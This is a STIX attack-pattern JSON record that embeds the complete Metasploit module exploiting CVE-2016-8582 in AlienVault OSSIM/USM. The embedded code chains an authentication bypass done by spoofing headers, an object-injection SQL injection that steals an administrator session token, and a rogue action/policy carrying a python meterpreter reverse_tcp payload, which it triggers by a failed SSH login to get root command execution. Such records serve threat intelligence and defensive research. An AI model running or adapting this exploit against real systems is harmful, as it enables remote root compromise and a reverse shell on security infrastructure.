{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c966b57-3010-4395-8714-071bd76a6020",
    "created": "2024-08-14T17:00:52.717076Z",
    "modified": "2024-08-14T17:00:52.71708Z",
    "name": "\"AlienVault OSSIM/USM Remote Code Execution\"",
    "description": " This module exploits object injection, authentication bypass and ip spoofing vulnerabilities all together. Unauthenticated users can execute arbitrary commands under the context of the root user.  By abusing authentication bypass issue on gauge.php lead adversaries to exploit object injection vulnerability which leads to SQL injection attack that leaks an administrator session token. Attackers can create a rogue action and policy that enables to execute operating system commands by using captured session token. As a final step SSH login attempt with an invalid credentials can trigger a created rogue policy which triggers an action that executes operating system command with root user privileges.  This module was tested against following product and versions: AlienVault USM 5.3.0, 5.2.5, 5.0.0, 4.15.11, 4.5.0 AlienVault OSSIM 5.0.0, 4.6.1  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/alienvault_exec.rb",
            "external_id": "alienvault_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-8582"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"AlienVault OSSIM/USM Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits object injection, authentication bypass and ip spoofing vulnerabilities all together.\n        Unauthenticated users can execute arbitrary commands under the context of the root user.\n\n        By abusing authentication bypass issue on gauge.php lead adversaries to exploit object injection vulnerability\n        which leads to SQL injection attack that leaks an administrator session token. Attackers can create a rogue\n        action and policy that enables to execute operating system commands by using captured session token. As a final step,\n        SSH login attempt with an invalid credentials can trigger a created rogue policy which triggers an action that executes\n        operating system command with root user privileges.\n\n        This module was tested against following product and versions:\n        AlienVault USM 5.3.0, 5.2.5, 5.0.0, 4.15.11, 4.5.0\n        AlienVault OSSIM 5.0.0, 4.6.1\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Peter Lapp', # EDB advisory owner\n          'Mehmet Ince <mehmet@mehmetince.net>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2016-8582'],\n          ['URL', 'https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/'],\n          ['EDB', '40682']\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL'      => true,\n          'WfsDelay' => 10,\n          'Payload'  => 'python/meterpreter/reverse_tcp'\n        },\n      'Platform'       => ['python'],\n      'Arch'           => ARCH_PYTHON,\n      'Targets'        =>\n        [\n          ['Alienvault USM/OSSIM <= 5.3.0', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-01-31',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable Alienvault OSSIM instance', '/'])\n      ])\n  end\n\n\n  def check\n    r = rand_text_alpha(15)\n    p = \"a:1:{s:4:\\\"type\\\";s:69:\\\"1 AND extractvalue(rand(),concat(0x3a,(SELECT '#{r}')))-- \\\";}\"\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'dashboard', 'sections', 'widgets', 'data', 'gauge.php'),\n      'headers' => {\n        'User-Agent' => 'AV Report Scheduler',\n      },\n      'vars_get' => {\n        'type' => 'alarm',\n        'wtype' => 'foo',\n        'asset' => 'ALL_ASSETS',\n        'height' => 1,\n        'value' => p\n      }\n    })\n\n    if res && res.code == 200 && res.body =~ /XPATH syntax error: ':#{r}'/\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n\n  end\n\n\n  def exploit\n    # Hijacking Administrator session by exploiting objection injection vuln that end up with sqli\n    print_status(\"Hijacking administrator session\")\n\n    sql = \"SELECT id FROM sessions LIMIT 1\"\n    p = \"a:1:{s:4:\\\"type\\\";s:#{(sql.length + 58).to_s}:\\\"1 AND extractvalue(rand(),concat(0x3a3a3a,(#{sql}),0x3a3a3a))-- \\\";}\"\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'dashboard', 'sections', 'widgets', 'data', 'gauge.php'),\n      'headers' => {\n        'X-Forwarded-For' => rhost.to_s,\n        'User-Agent' => 'AV Report Scheduler',\n      },\n      'vars_get' => {\n        'type' => 'alarm',\n        'wtype' => 'foo',\n        'asset' => 'ALL_ASSETS',\n        'height' => 1,\n        'value' => p\n      }\n    })\n    if res && res.code == 200 && res.body =~ /XPATH syntax error: ':::(.*):::'/\n      admin_session = $1\n      cookie = \"PHPSESSID=#{admin_session}\"\n      print_good(\"Admin session token : #{cookie}\")\n    else\n      fail_with(Failure::Unknown, \"Session table is empty. Wait until someone logged in and try again\")\n    end\n\n    # Creating a Action that contains payload.\n    print_status(\"Creating rogue action\")\n    r = rand_text_alpha(15)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'action', 'modifyactions.php'),\n      'cookie' => cookie,\n      'headers' => {\n        'X-Forwarded-For' => rhost.to_s,\n      },\n        'vars_post' => {\n          'id' => '',\n          'action' => 'new',\n          'old_name' => '',\n          'action_name' => r,\n          'ctx' => '',\n          'old_descr' => '',\n          'descr' => r,\n          'action_type' => '2',\n          'only' => 'on',\n          'cond' => 'True',\n          'email_from' => '',\n          'email_to' => 'email;email;email',\n          'email_subject' => '',\n          'email_message' => '',\n          'transferred_user' => '',\n          'transferred_entity' => '',\n          'exec_command' => \"python -c \\\"#{payload.encoded}\\\"\"\n      }\n    })\n\n    if res && res.code == 200 && res.body.include?(\"Action successfully updated\")\n      print_good(\"Action created: #{r}\")\n    else\n      fail_with(Failure::Unknown, \"Unable to create action\")\n    end\n\n    # Retrieving the policy id. Authentication Bypass with User-Agent Doesn't work for this endpoint.\n    # Thus we're using hijacked administrator session.\n    print_status(\"Retrieving rogue action id\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"action\", \"getaction.php\"),\n      'cookie' => cookie,\n      'headers' => {\n        'X-Forwarded-For' => rhost.to_s,\n      },\n      'vars_get' => {\n        'page' => '1',\n        'rp'   => '2000'\n      }\n    })\n\n    if res && res.code == 200 && res.body =~ /actionform\\.php\\?id=(.*)'>#{r}<\\/a>/\n      action_id = $1\n      print_good(\"Corresponding Action ID found: #{action_id}\")\n    else\n      fail_with(Failure::Unknown, \"Unable to retrieve action id\")\n    end\n\n    # Retrieving the policy data. We will use it while creating policy\n    print_status(\"Retrieving policy ctx and group values\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path.to_s, \"ossim\", \"policy\", \"policy.php\"),\n      'cookie' => cookie,\n      'headers' => {\n        'X-Forwarded-For' => rhost.to_s,\n      },\n      'vars_get' => {\n        'm_opt' => 'configuration',\n        'sm_opt' => 'threat_intelligence',\n        'h_opt' => 'policy'\n      }\n    })\n\n    if res && res.code == 200 && res.body =~ /getpolicy\\.php\\?ctx=(.*)\\&group=(.*)',/\n      policy_ctx = $1\n      policy_group = $2\n      print_good(\"CTX Value found: #{policy_ctx}\")\n      print_good(\"GROUP Value found: #{policy_group}\")\n    else\n      fail_with(Failure::Unknown, \"Unable to retrieve policy data\")\n    end\n\n    # Creating policy that will be trigerred when SSH authentication failed due to wrong password.\n    print_status(\"Creating a policy that uses our rogue action\")\n    policy = rand_text_alpha(15)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"policy\", \"newpolicy.php\"),\n      'cookie' => cookie,\n      'headers' => {\n        'X-Forwarded-For' => rhost.to_s,\n      },\n      'vars_post' => {\n        'descr' => policy,\n        'active' => '1',\n        'group' => policy_group,\n        'ctx' => policy_ctx,\n        'order' => '1',\n        'action' => 'new',\n        'sources[]' => '00000000000000000000000000000000',\n        'dests[]' => '00000000000000000000000000000000',\n        'portsrc[]' => '0',\n        'portdst[]' => '0',\n        'plug_type' => '1',\n        'plugins[0]' => 'on',\n        'taxfilters[]' =>'25@2@0',\n        'tax_pt' => '0',\n        'tax_cat' => '0',\n        'tax_subc' => '0',\n        'mboxs[]' => '00000000000000000000000000000000',\n        'rep_act' => '0',\n        'rep_sev' => '1',\n        'rep_rel' => '1',\n        'rep_dir' => '0',\n        'ev_sev' => '1',\n        'ev_rel' => '1',\n        'tzone' => 'Europe/Istanbul',\n        'date_type' => '1',\n        'begin_hour' => '0',\n        'begin_minute' => '0',\n        'begin_day_week' => '1',\n        'begin_day_month' => '1',\n        'begin_month' => '1',\n        'end_hour' => '23',\n        'end_minute' => '59',\n        'end_day_week' => '7',\n        'end_day_month' => '31',\n        'end_month' => '12',\n        'actions[]' => action_id,\n        'sim' => '1',\n        'priority' => '1',\n        'qualify' => '1',\n        'correlate' => '0',\n        'cross_correlate' => '0',\n        'store' => '0'\n        }\n      })\n\n    if res && res.code == 200\n      print_good(\"Policy created: #{policy}\")\n    else\n      fail_with(Failure::Unknown, \"Unable to create policy id\")\n    end\n\n    # We gotta reload all policies in order to make our rogue one enabled.\n    print_status(\"Activating the policy\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"conf\", \"reload.php\"),\n      'cookie' => cookie,\n      'headers' => {\n        'X-Forwarded-For' => rhost.to_s,\n      },\n      'vars_get' => {\n      'what' => 'policies',\n        'back' => '../policy/policy.php'\n      }\n    })\n\n    if res && res.code == 200\n      print_good(\"Rogue policy activated\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to enable rogue policy\")\n    end\n\n    # We will trigger the rogue policy by doing ssh auth attempt with invalid credential :-)\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password'],\n      port: 22,\n      password: rand_text_alpha(15)\n    })\n\n    print_status(\"Triggering the policy by performing SSH login attempt\")\n\n    begin\n      Net::SSH.start(rhost, \"root\", opts)\n    rescue Net::SSH::AuthenticationFailed\n      print_good(\"SSH - Failed authentication. That means our policy and action will be trigged..!\")\n    rescue Net::SSH::Exception => e\n      print_error(\"SSH Error: #{e.class} : #{e.message}\")\n      return nil\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-01-31",
    "x_mitre_platforms": [
        "['python']"
    ]
}